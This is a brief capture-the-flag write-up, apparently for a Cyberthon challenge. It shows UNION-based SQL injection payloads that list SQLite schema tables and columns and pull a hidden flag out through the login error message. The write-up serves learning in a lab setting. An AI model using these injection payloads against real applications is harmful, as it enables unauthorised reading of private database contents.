# Secret base 2

This challenge is quite annoyingly similar to secret base 1.

Let's do some more poking around: I'll just show the union part for brevity

```sql
Payload: union select  tbl_name, sql , 'abcd' from sqlite_master where tbl_name not like 'users_table';--
Response: Invalid password for CREATE TABLE keep_looking(keep TEXT, looking TEXT )!
```

Hmm

```sql
Payload: union select  tbl_name, sql , 'abcd' from sqlite_master where tbl_name not like 'users_table' and tbl_name not like 'keep_looking';--
Response: Invalid password for CREATE TABLE s3cr3t_table(f1r5t_c0lumn TEXT, s3c0nd_c0lumn TEXT,
			s3cr3t_c0lumn TEXT )! 
```

Hmm!

```sqlite
Payload: union select  f1r5t_c0lumn,s3cr3t_c0lumn , 'abcd' from s3cr3t_table;--
Response: Invalid password for Cyberthon{an0th3r_fl@g_1n_dAtab@se}! 
```

!!

